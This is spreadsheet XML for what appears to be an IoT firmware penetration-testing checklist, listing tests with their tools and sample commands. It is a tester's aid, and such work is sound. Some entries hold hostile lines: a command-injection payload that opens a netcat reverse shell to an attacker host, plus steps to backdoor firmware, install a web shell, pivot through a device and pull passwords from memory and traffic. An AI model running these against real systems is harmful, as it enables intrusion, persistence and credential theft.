  <si>
    <t xml:space="preserve">KillerBee</t>
  </si>
  <si>
    <t xml:space="preserve">zbstumbler
zbdump -f capture.pcap
Analyze with Wireshark</t>
  </si>
  <si>
    <t xml:space="preserve">Test WiFi Security</t>
  </si>
  <si>
    <t xml:space="preserve">aircrack-ng, Wireshark</t>
  </si>
  <si>
    <t xml:space="preserve">Test WiFi implementation</t>
  </si>
  <si>
    <t xml:space="preserve">aircrack-ng</t>
  </si>
  <si>
    <t xml:space="preserve">airodump-ng wlan0mon
aireplay-ng -0 1 -a BSSID wlan0mon
aircrack-ng capture.cap</t>
  </si>
  <si>
    <t xml:space="preserve">Reverse Engineer Mobile App</t>
  </si>
  <si>
    <t xml:space="preserve">Mobile</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze companion mobile app</t>
  </si>
  <si>
    <t xml:space="preserve">jadx -d output/ app.apk
apktool d app.apk
grep -r 'firmware\|api' output/</t>
  </si>
  <si>
    <t xml:space="preserve">Extract Firmware URLs from App</t>
  </si>
  <si>
    <t xml:space="preserve">jadx, grep, strings</t>
  </si>
  <si>
    <t xml:space="preserve">Find firmware download URLs</t>
  </si>
  <si>
    <t xml:space="preserve">jadx, grep</t>
  </si>
  <si>
    <t xml:space="preserve">jadx -d output/ app.apk
grep -rE 'https?://.*\.bin' output/
strings app.apk | grep firmware</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze App Communication Protocol</t>
  </si>
  <si>
    <t xml:space="preserve">Burp Suite, Wireshark</t>
  </si>
  <si>
    <t xml:space="preserve">Understand app-device protocol</t>
  </si>
  <si>
    <t xml:space="preserve">Setup MITM proxy
Capture app traffic
Analyze message format
Reverse protocol</t>
  </si>
  <si>
    <t xml:space="preserve">Extract Hardcoded SSIDs</t>
  </si>
  <si>
    <t xml:space="preserve">Find WiFi SSIDs in app</t>
  </si>
  <si>
    <t xml:space="preserve">jadx -d output/ app.apk
grep -ri 'ssid\|wifi' output/
Check for default WiFi configs</t>
  </si>
  <si>
    <t xml:space="preserve">Test App for Insecure Storage</t>
  </si>
  <si>
    <t xml:space="preserve">adb, objection</t>
  </si>
  <si>
    <t xml:space="preserve">Check app data storage</t>
  </si>
  <si>
    <t xml:space="preserve">adb shell
run-as com.app
ls -la
cat shared_prefs/*.xml</t>
  </si>
  <si>
    <t xml:space="preserve">M2 - Insecure Data Storage</t>
  </si>
  <si>
    <t xml:space="preserve">Exploit Buffer Overflow</t>
  </si>
  <si>
    <t xml:space="preserve">GDB, pwntools, ROPgadget</t>
  </si>
  <si>
    <t xml:space="preserve">Develop buffer overflow exploit</t>
  </si>
  <si>
    <t xml:space="preserve">GDB, Python</t>
  </si>
  <si>
    <t xml:space="preserve">gdb binary
pattern create 200
Generate ROP chain
Develop exploit with pwntools</t>
  </si>
  <si>
    <t xml:space="preserve">Exploit Command Injection</t>
  </si>
  <si>
    <t xml:space="preserve">Burp Suite, curl, netcat</t>
  </si>
  <si>
    <t xml:space="preserve">Exploit command injection</t>
  </si>
  <si>
    <t xml:space="preserve">curl, nc</t>
  </si>
  <si>
    <t xml:space="preserve">curl 'http://device/vuln.cgi?cmd=;nc attacker 4444 -e /bin/sh'
Reverse shell payloads</t>
  </si>
  <si>
    <t xml:space="preserve">Gain Root Shell via UART</t>
  </si>
  <si>
    <t xml:space="preserve">Access bootloader/root shell</t>
  </si>
  <si>
    <t xml:space="preserve">screen /dev/ttyUSB0 115200
Interrupt boot process
Modify bootargs
Gain root shell</t>
  </si>
  <si>
    <t xml:space="preserve">Modify Firmware and Repack</t>
  </si>
  <si>
    <t xml:space="preserve">Backdoor firmware</t>
  </si>
  <si>
    <t xml:space="preserve">binwalk, fmk</t>
  </si>
  <si>
    <t xml:space="preserve">binwalk -e firmware.bin
Modify files
build-ng.sh firmware/
Test modified firmware</t>
  </si>
  <si>
    <t xml:space="preserve">Create Persistent Backdoor</t>
  </si>
  <si>
    <t xml:space="preserve">custom scripts, cron</t>
  </si>
  <si>
    <t xml:space="preserve">Maintain access to device</t>
  </si>
  <si>
    <t xml:space="preserve">bash, cron</t>
  </si>
  <si>
    <t xml:space="preserve">Add SSH keys
Create cron job
Modify init scripts
Install web shell</t>
  </si>
  <si>
    <t xml:space="preserve">Pivot to Internal Network</t>
  </si>
  <si>
    <t xml:space="preserve">Post-Exploitation</t>
  </si>
  <si>
    <t xml:space="preserve">proxychains, chisel, ssh</t>
  </si>
  <si>
    <t xml:space="preserve">Use device as pivot point</t>
  </si>
  <si>
    <t xml:space="preserve">proxychains, chisel</t>
  </si>
  <si>
    <t xml:space="preserve">ssh -D 1080 root@device
proxychains nmap internal-network
chisel server/client</t>
  </si>
  <si>
    <t xml:space="preserve">Extract Credentials from Memory</t>
  </si>
  <si>
    <t xml:space="preserve">GDB, strings</t>
  </si>
  <si>
    <t xml:space="preserve">Dump credentials from RAM</t>
  </si>
  <si>
    <t xml:space="preserve">gdb -p PID
dump memory mem.dump 0x400000 0x500000
strings mem.dump | grep -i pass</t>
  </si>
  <si>
    <t xml:space="preserve">Sniff Network Traffic from Device</t>
  </si>
  <si>
    <t xml:space="preserve">tcpdump, Wireshark</t>
  </si>
  <si>
    <t xml:space="preserve">Capture internal traffic</t>
  </si>
  <si>
    <t xml:space="preserve">tcpdump</t>
  </si>
  <si>
    <t xml:space="preserve">tcpdump -i br0 -w capture.pcap
tcpdump -i eth0 -A | grep -i password</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze Running Processes</t>
  </si>
  <si>
    <t xml:space="preserve">ps, top, lsof</t>
  </si>
  <si>
    <t xml:space="preserve">Enumerate running services</t>
  </si>
  <si>
    <t xml:space="preserve">ps, lsof</t>
  </si>
  <si>
    <t xml:space="preserve">ps aux
top
lsof -i
netstat -tulpn</t>
  </si>
  <si>
    <t xml:space="preserve">Check for Update Mechanism Vulnerabilities</t>
  </si>
  <si>
    <t xml:space="preserve">Update</t>
  </si>
  <si>
    <t xml:space="preserve">Burp Suite, mitmproxy</t>
  </si>
  <si>
    <t xml:space="preserve">Test firmware update process</t>
  </si>
  <si>
    <t xml:space="preserve">Intercept update traffic
Test for signature verification
Attempt downgrade attack
Test for MITM</t>
  </si>
  <si>
    <t xml:space="preserve">Test for Debug Interfaces</t>
  </si>
  <si>
    <t xml:space="preserve">multimeter, logic analyzer</t>
  </si>
  <si>
    <t xml:space="preserve">Identify UART/JTAG/SWD</t>
  </si>
  <si>
    <t xml:space="preserve">multimeter, buspirate</t>
  </si>
  <si>
    <t xml:space="preserve">Identify TX/RX pins with multimeter
Test baud rates
JTAG pin identification</t>
  </si>
  <si>
    <t xml:space="preserve">Dump Bootloader</t>
  </si>
  <si>
    <t xml:space="preserve">UART, JTAG, OpenOCD</t>
  </si>
  <si>
    <t xml:space="preserve">Extract bootloader (U-Boot)</t>
  </si>
  <si>
    <t xml:space="preserve">screen, openocd</t>
  </si>
  <si>
    <t xml:space="preserve">Interrupt boot process
Access U-Boot shell
Dump bootloader commands</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze Bootloader Security</t>
  </si>
  <si>
    <t xml:space="preserve">Boot Security</t>
  </si>
  <si>
    <t xml:space="preserve">UART, strings</t>
  </si>
  <si>
    <t xml:space="preserve">Test secure boot implementation</t>
  </si>
  <si>
    <t xml:space="preserve">screen, strings</t>
  </si>
  <si>
    <t xml:space="preserve">Check for secure boot
Test signature verification
Attempt to load unsigned firmware</t>
  </si>
  <si>
    <t xml:space="preserve">Test for Cloud API Security</t>
  </si>
  <si>
    <t xml:space="preserve">Cloud</t>
  </si>
  <si>
    <t xml:space="preserve">Burp Suite, Postman</t>
  </si>
  <si>
    <t xml:space="preserve">Test cloud backend API</t>
  </si>
  <si>
    <t xml:space="preserve">Test API authentication
Check for IDOR
Test rate limiting
API fuzzing</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze Firmware Update Signature</t>
  </si>
  <si>
    <t xml:space="preserve">Crypto</t>
  </si>
  <si>
    <t xml:space="preserve">openssl, binwalk</t>
  </si>
  <si>
    <t xml:space="preserve">Verify update signatures</t>
  </si>
  <si>
    <t xml:space="preserve">binwalk firmware.bin
openssl dgst -sha256 -verify pubkey.pem -signature sig.bin firmware.bin</t>
  </si>
  <si>
    <t xml:space="preserve">Test for Weak Cryptographic Algorithms</t>
  </si>
  <si>
    <t xml:space="preserve">Identify weak crypto</t>
  </si>
  <si>
    <t xml:space="preserve">strings firmware.bin | grep -iE 'md5|des|rc4'
grep -r 'MD5\|DES' extracted_fs/</t>
  </si>
  <si>
    <t xml:space="preserve">Check for Sensitive Data in Logs</t>
  </si>
  <si>
    <t xml:space="preserve">Logging</t>
  </si>
  <si>
    <t xml:space="preserve">cat, grep, tail</t>
  </si>
  <si>
    <t xml:space="preserve">Review system logs</t>
  </si>
  <si>
    <t xml:space="preserve">cat, grep</t>
  </si>
  <si>
    <t xml:space="preserve">cat /var/log/messages
tail -f /var/log/syslog | grep -i password
check dmesg</t>
  </si>
  <si>
    <t xml:space="preserve">Test for Memory Corruption Bugs</t>
  </si>
  <si>
    <t xml:space="preserve">AFL++, GDB, ASAN</t>
  </si>
  <si>
    <t xml:space="preserve">Fuzz binaries for crashes</t>
  </si>
  <si>
    <t xml:space="preserve">AFL++, GDB</t>
  </si>
  <si>
    <t xml:space="preserve">afl-fuzz -i input/ -o output/ ./binary @@
Analyze crashes with GDB
Compile with ASAN</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze Third-Party Components</t>
  </si>
  <si>
    <t xml:space="preserve">Dependencies</t>
  </si>
  <si>
    <t xml:space="preserve">grep, cve-bin-tool</t>
  </si>
  <si>
    <t xml:space="preserve">Check for vulnerable libraries</t>
  </si>
  <si>
    <t xml:space="preserve">cve-bin-tool</t>
  </si>
  <si>
    <t xml:space="preserve">find extracted_fs/ -name '*.so'
cve-bin-tool extracted_fs/
Check library versions</t>
  </si>
  <si>
    <t xml:space="preserve">Test for Privilege Escalation</t>
  </si>
  <si>
    <t xml:space="preserve">sudo, SUID, cron</t>
  </si>
  <si>
    <t xml:space="preserve">Escalate to root privileges</t>
  </si>
  <si>
    <t xml:space="preserve">find, sudo</t>
  </si>
  <si>
    <t xml:space="preserve">find / -perm -4000 2&gt;/dev/null
sudo -l
check cron jobs
exploit SUID binaries</t>
  </si>
  <si>
    <t xml:space="preserve">Check for Information Disclosure</t>
  </si>
  <si>
    <t xml:space="preserve">Information Disclosure</t>
  </si>
  <si>
    <t xml:space="preserve">grep, strings</t>
  </si>
  <si>
    <t xml:space="preserve">Find leaked sensitive info</t>
  </si>
  <si>
    <t xml:space="preserve">grep -r 'TODO\|DEBUG\|XXX' extracted_fs/
strings firmware.bin | grep -i 'internal\|secret'</t>
  </si>
  <si>
    <t xml:space="preserve">Test Device Reset/Recovery</t>
  </si>
  <si>
    <t xml:space="preserve">Physical Security</t>
  </si>
  <si>
    <t xml:space="preserve">manual testing</t>
  </si>
  <si>
    <t xml:space="preserve">Test factory reset security</t>
  </si>
  <si>
    <t xml:space="preserve">manual</t>
  </si>
  <si>
    <t xml:space="preserve">Perform factory reset
Check if data is wiped
Test for data recovery
Verify secure deletion</t>
  </si>
  <si>
    <t xml:space="preserve">Check for Code Signing</t>
  </si>
  <si>
    <t xml:space="preserve">codesign, openssl</t>
  </si>
  <si>
    <t xml:space="preserve">Verify binary signatures</t>
  </si>
  <si>
    <t xml:space="preserve">openssl, checksec</t>
  </si>
  <si>
    <t xml:space="preserve">Check for signature verification
Test unsigned binary execution
Analyze trust chain</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze GPIO Interfaces</t>
  </si>
  <si>
    <t xml:space="preserve">GPIO tools, multimeter</t>
  </si>
  <si>
    <t xml:space="preserve">Test GPIO security</t>
  </si>
  <si>
    <t xml:space="preserve">gpioinfo, gpio</t>
  </si>
  <si>
    <t xml:space="preserve">gpioinfo
gpio read/write
Test for unauthorized GPIO access</t>
  </si>
  <si>
    <t xml:space="preserve">Test for Timing Attacks</t>
  </si>
  <si>
    <t xml:space="preserve">Side Channel</t>
  </si>
  <si>
    <t xml:space="preserve">timing analysis tools</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze timing vulnerabilities</t>
  </si>
  <si>
    <t xml:space="preserve">custom scripts</t>
  </si>
  <si>
    <t xml:space="preserve">Measure response times
Analyze authentication timing
Test for timing leaks</t>
  </si>
  <si>
    <t xml:space="preserve">Check for XML/XXE Vulnerabilities</t>
  </si>
  <si>
    <t xml:space="preserve">Burp Suite, xxeserve</t>
  </si>
  <si>
    <t xml:space="preserve">Test for XXE attacks</t>
  </si>
  <si>
    <t xml:space="preserve">Test XML parsers
Attempt XXE payloads
Check for file disclosure</t>
  </si>
  <si>
    <t xml:space="preserve">8.2</t>
  </si>
  <si>
    <t xml:space="preserve">Analyze Crash Dumps</t>
  </si>
  <si>
    <t xml:space="preserve">Forensics</t>
  </si>
  <si>
    <t xml:space="preserve">Review crash artifacts</t>
  </si>
  <si>
    <t xml:space="preserve">strings core.dump
gdb binary core
Analyze stack trace</t>
  </si>
  <si>
    <t xml:space="preserve">Test for Race Conditions</t>
  </si>
  <si>
    <t xml:space="preserve">Test for TOCTOU bugs</t>
  </si>
  <si>
    <t xml:space="preserve">bash, Python</t>
  </si>
  <si>
    <t xml:space="preserve">Concurrent file operations
Race condition in auth
Timing-based attacks</t>
  </si>
  <si>
    <t xml:space="preserve">Check for Insecure Deserialization</t>
  </si>
  <si>
    <t xml:space="preserve">ysoserial, Burp</t>
  </si>
  <si>
    <t xml:space="preserve">Test deserialization flaws</t>
  </si>
  <si>
    <t xml:space="preserve">Identify serialized objects
Test with ysoserial payloads
Analyze deserialization code</t>
  </si>
  <si>
    <t xml:space="preserve">A08:2021 - Software &amp; Data Integrity</t>
  </si>
  <si>
    <t xml:space="preserve">Document and Report Findings</t>
  </si>
  <si>
    <t xml:space="preserve">Reporting</t>
  </si>
  <si>
    <t xml:space="preserve">Documentation</t>
  </si>
  <si>
    <t xml:space="preserve">markdown, screenshots</t>
  </si>
  <si>
    <t xml:space="preserve">Create comprehensive report</t>
  </si>
  <si>
    <t xml:space="preserve">text editor, tools</t>
  </si>
  <si>
    <t xml:space="preserve">Document all vulnerabilities
Include PoC exploits
Provide remediation steps
Risk assessment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</si>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</sst>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90EE90"/>
        <bgColor rgb="FF99CCFF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</row>
    <row r="4" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A4" s="2" t="s">
        <v>4</v>
      </c>
      <c r="B4" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!D:D,"Critical")</f>
        <v>24</v>
      </c>
      <c r="C4" s="3" t="n">
        <f aca="false">B4/$B$8*100</f>
        <v>24</v>
      </c>
    </row>
    <row r="5" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A5" s="2" t="s">
        <v>5</v>
      </c>
      <c r="B5" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!D:D,"High")</f>
        <v>56</v>
      </c>
      <c r="C5" s="3" t="n">
        <f aca="false">B5/$B$8*100</f>
        <v>56</v>
      </c>
    </row>
    <row r="6" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A6" s="2" t="s">
        <v>6</v>
      </c>
      <c r="B6" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!D:D,"Medium")</f>
        <v>17</v>
      </c>
      <c r="C6" s="3" t="n">
        <f aca="false">B6/$B$8*100</f>
        <v>17</v>
      </c>
    </row>
    <row r="7" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A7" s="2" t="s">
        <v>7</v>
      </c>
      <c r="B7" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!D:D,"Low")</f>
        <v>3</v>
      </c>
      <c r="C7" s="3" t="n">
        <f aca="false">B7/$B$8*100</f>
        <v>3</v>
      </c>
    </row>
    <row r="8" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A8" s="2" t="s">
        <v>8</v>
      </c>
      <c r="B8" s="3" t="n">
        <f aca="false">COUNTA('Firmware Security Tests'!A:A)-1</f>
        <v>100</v>
      </c>
      <c r="C8" s="3" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="10" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A10" s="2" t="s">
        <v>10</v>
      </c>
      <c r="B10" s="3" t="s">
        <v>2</v>
      </c>
    </row>
    <row r="11" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A11" s="2" t="s">
        <v>11</v>
      </c>
      <c r="B11" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!E:E,"Static")</f>
        <v>45</v>
      </c>
    </row>
    <row r="12" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A12" s="2" t="s">
        <v>12</v>
      </c>
      <c r="B12" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!E:E,"Dynamic")</f>
        <v>14</v>
      </c>
    </row>
    <row r="13" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A13" s="2" t="s">
        <v>13</v>
      </c>
      <c r="B13" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!E:E,"Network")</f>
        <v>13</v>
      </c>
    </row>
    <row r="14" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A14" s="2" t="s">
        <v>14</v>
      </c>
      <c r="B14" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!E:E,"Hardware")</f>
        <v>14</v>
      </c>
    </row>
    <row r="15" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A15" s="2" t="s">
        <v>15</v>
      </c>
      <c r="B15" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!E:E,"Exploitation")</f>
        <v>13</v>
      </c>
    </row>
    <row r="16" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A16" s="2" t="s">
        <v>16</v>
      </c>
      <c r="B16" s="3" t="n">
        <f aca="false">COUNTA('Firmware Security Tests'!E:E)-SUM(B11:B15)-1</f>
        <v>1</v>
      </c>
    </row>
    <row r="18" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A18" s="2" t="s">
        <v>17</v>
      </c>
      <c r="B18" s="3" t="s">
        <v>2</v>
      </c>
    </row>
    <row r="19" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A19" s="2" t="s">
        <v>18</v>
      </c>
      <c r="B19" s="3" t="n">
        <f aca="false">COUNTIFS('Firmware Security Tests'!K:K,"&gt;=9")</f>
        <v>0</v>
      </c>
    </row>
    <row r="20" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A20" s="2" t="s">
        <v>19</v>
      </c>
      <c r="B20" s="3" t="n">
        <f aca="false">COUNTIFS('Firmware Security Tests'!K:K,"&gt;=7",'Firmware Security Tests'!K:K,"&lt;9")</f>
        <v>0</v>
      </c>
    </row>
    <row r="21" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A21" s="2" t="s">
        <v>20</v>
      </c>
      <c r="B21" s="3" t="n">
        <f aca="false">COUNTIFS('Firmware Security Tests'!K:K,"&gt;=4",'Firmware Security Tests'!K:K,"&lt;7")</f>
        <v>0</v>
      </c>
    </row>
    <row r="22" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A22" s="2" t="s">
        <v>21</v>
      </c>
      <c r="B22" s="3" t="n">
        <f aca="false">COUNTIFS('Firmware Security Tests'!K:K,"&gt;=0.1",'Firmware Security Tests'!K:K,"&lt;4")</f>
        <v>0</v>
      </c>
    </row>
    <row r="23" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A23" s="2" t="s">
        <v>22</v>
      </c>
      <c r="B23" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!K:K,"0.0")</f>
        <v>6</v>
      </c>
    </row>
    <row r="25" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A25" s="2" t="s">
        <v>23</v>
      </c>
      <c r="B25" s="3" t="s">
        <v>2</v>
      </c>
    </row>
    <row r="26" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A26" s="2" t="s">
        <v>24</v>
      </c>
      <c r="B26" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!C:C,"Acquisition")</f>
        <v>7</v>
      </c>
    </row>
    <row r="27" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A27" s="2" t="s">
        <v>25</v>
      </c>
      <c r="B27" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!C:C,"Analysis")</f>
        <v>3</v>
      </c>
    </row>
    <row r="28" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A28" s="2" t="s">
        <v>26</v>
      </c>
      <c r="B28" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!C:C,"Extraction")</f>
        <v>5</v>
      </c>
    </row>
    <row r="29" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A29" s="2" t="s">
        <v>27</v>
      </c>
      <c r="B29" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!C:C,"Secrets")</f>
        <v>6</v>
      </c>
    </row>
    <row r="30" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A30" s="2" t="s">
        <v>28</v>
      </c>
      <c r="B30" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!C:C,"Reverse Engineering")</f>
        <v>4</v>
      </c>
    </row>
    <row r="31" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A31" s="2" t="s">
        <v>15</v>
      </c>
      <c r="B31" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!C:C,"Exploitation")</f>
        <v>14</v>
      </c>
    </row>
    <row r="32" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A32" s="2" t="s">
        <v>29</v>
      </c>
      <c r="B32" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!C:C,"Web")</f>
        <v>2</v>
      </c>
    </row>
    <row r="33" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A33" s="2" t="s">
        <v>13</v>
      </c>
      <c r="B33" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!C:C,"Network")</f>
        <v>3</v>
      </c>
    </row>
    <row r="34" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A34" s="2" t="s">
        <v>14</v>
      </c>
      <c r="B34" s="3" t="n">
        <f aca="false">COUNTIF('Firmware Security Tests'!C:C,"Hardware")</f>
        <v>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32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customFormat="false" ht="28.35" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A2" s="5" t="n">
        <v>1</v>
      </c>
      <c r="B2" s="5" t="s">
        <v>41</v>
      </c>
      <c r="C2" s="5" t="s">
        <v>24</v>
      </c>
      <c r="D2" s="6" t="s">
        <v>7</v>
      </c>
      <c r="E2" s="5" t="s">
        <v>11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</row>
    <row r="3" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A3" s="5" t="n">
        <v>2</v>
      </c>
      <c r="B3" s="5" t="s">
        <v>48</v>
      </c>
      <c r="C3" s="5" t="s">
        <v>24</v>
      </c>
      <c r="D3" s="6" t="s">
        <v>7</v>
      </c>
      <c r="E3" s="5" t="s">
        <v>11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46</v>
      </c>
      <c r="K3" s="5" t="s">
        <v>47</v>
      </c>
    </row>
    <row r="4" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A4" s="5" t="n">
        <v>3</v>
      </c>
      <c r="B4" s="5" t="s">
        <v>53</v>
      </c>
      <c r="C4" s="5" t="s">
        <v>24</v>
      </c>
      <c r="D4" s="7" t="s">
        <v>5</v>
      </c>
      <c r="E4" s="5" t="s">
        <v>13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58</v>
      </c>
      <c r="K4" s="5" t="s">
        <v>59</v>
      </c>
    </row>
    <row r="5" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A5" s="5" t="n">
        <v>4</v>
      </c>
      <c r="B5" s="5" t="s">
        <v>60</v>
      </c>
      <c r="C5" s="5" t="s">
        <v>24</v>
      </c>
      <c r="D5" s="8" t="s">
        <v>6</v>
      </c>
      <c r="E5" s="5" t="s">
        <v>11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46</v>
      </c>
      <c r="K5" s="5" t="s">
        <v>65</v>
      </c>
    </row>
    <row r="6" customFormat="false" ht="55.2" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A6" s="5" t="n">
        <v>5</v>
      </c>
      <c r="B6" s="5" t="s">
        <v>66</v>
      </c>
      <c r="C6" s="5" t="s">
        <v>24</v>
      </c>
      <c r="D6" s="7" t="s">
        <v>5</v>
      </c>
      <c r="E6" s="5" t="s">
        <v>14</v>
      </c>
      <c r="F6" s="5" t="s">
        <v>67</v>
      </c>
      <c r="G6" s="5" t="s">
        <v>68</v>
      </c>
      <c r="H6" s="5" t="s">
        <v>69</v>
      </c>
      <c r="I6" s="5" t="s">
        <v>70</v>
      </c>
      <c r="J6" s="5" t="s">
        <v>71</v>
      </c>
      <c r="K6" s="5" t="s">
        <v>72</v>
      </c>
    </row>
    <row r="7" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A7" s="5" t="n">
        <v>6</v>
      </c>
      <c r="B7" s="5" t="s">
        <v>73</v>
      </c>
      <c r="C7" s="5" t="s">
        <v>24</v>
      </c>
      <c r="D7" s="7" t="s">
        <v>5</v>
      </c>
      <c r="E7" s="5" t="s">
        <v>14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71</v>
      </c>
      <c r="K7" s="5" t="s">
        <v>72</v>
      </c>
    </row>
    <row r="8" customFormat="false" ht="28.35" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A8" s="5" t="n">
        <v>7</v>
      </c>
      <c r="B8" s="5" t="s">
        <v>78</v>
      </c>
      <c r="C8" s="5" t="s">
        <v>24</v>
      </c>
      <c r="D8" s="7" t="s">
        <v>5</v>
      </c>
      <c r="E8" s="5" t="s">
        <v>14</v>
      </c>
      <c r="F8" s="5" t="s">
        <v>79</v>
      </c>
      <c r="G8" s="5" t="s">
        <v>80</v>
      </c>
      <c r="H8" s="5" t="s">
        <v>81</v>
      </c>
      <c r="I8" s="5" t="s">
        <v>82</v>
      </c>
      <c r="J8" s="5" t="s">
        <v>71</v>
      </c>
      <c r="K8" s="5" t="s">
        <v>72</v>
      </c>
    </row>
    <row r="9" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A9" s="5" t="n">
        <v>8</v>
      </c>
      <c r="B9" s="5" t="s">
        <v>83</v>
      </c>
      <c r="C9" s="5" t="s">
        <v>25</v>
      </c>
      <c r="D9" s="6" t="s">
        <v>7</v>
      </c>
      <c r="E9" s="5" t="s">
        <v>11</v>
      </c>
      <c r="F9" s="5" t="s">
        <v>84</v>
      </c>
      <c r="G9" s="5" t="s">
        <v>85</v>
      </c>
      <c r="H9" s="5" t="s">
        <v>84</v>
      </c>
      <c r="I9" s="5" t="s">
        <v>86</v>
      </c>
      <c r="J9" s="5" t="s">
        <v>46</v>
      </c>
      <c r="K9" s="5" t="s">
        <v>47</v>
      </c>
    </row>
    <row r="10" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A10" s="5" t="n">
        <v>9</v>
      </c>
      <c r="B10" s="5" t="s">
        <v>87</v>
      </c>
      <c r="C10" s="5" t="s">
        <v>25</v>
      </c>
      <c r="D10" s="8" t="s">
        <v>6</v>
      </c>
      <c r="E10" s="5" t="s">
        <v>11</v>
      </c>
      <c r="F10" s="5" t="s">
        <v>88</v>
      </c>
      <c r="G10" s="5" t="s">
        <v>89</v>
      </c>
      <c r="H10" s="5" t="s">
        <v>88</v>
      </c>
      <c r="I10" s="5" t="s">
        <v>90</v>
      </c>
      <c r="J10" s="5" t="s">
        <v>91</v>
      </c>
      <c r="K10" s="5" t="s">
        <v>65</v>
      </c>
    </row>
    <row r="11" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A11" s="5" t="n">
        <v>10</v>
      </c>
      <c r="B11" s="5" t="s">
        <v>92</v>
      </c>
      <c r="C11" s="5" t="s">
        <v>25</v>
      </c>
      <c r="D11" s="8" t="s">
        <v>6</v>
      </c>
      <c r="E11" s="5" t="s">
        <v>11</v>
      </c>
      <c r="F11" s="5" t="s">
        <v>93</v>
      </c>
      <c r="G11" s="5" t="s">
        <v>94</v>
      </c>
      <c r="H11" s="5" t="s">
        <v>95</v>
      </c>
      <c r="I11" s="5" t="s">
        <v>96</v>
      </c>
      <c r="J11" s="5" t="s">
        <v>97</v>
      </c>
      <c r="K11" s="5" t="s">
        <v>98</v>
      </c>
    </row>
    <row r="12" customFormat="false" ht="41.75" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A12" s="5" t="n">
        <v>11</v>
      </c>
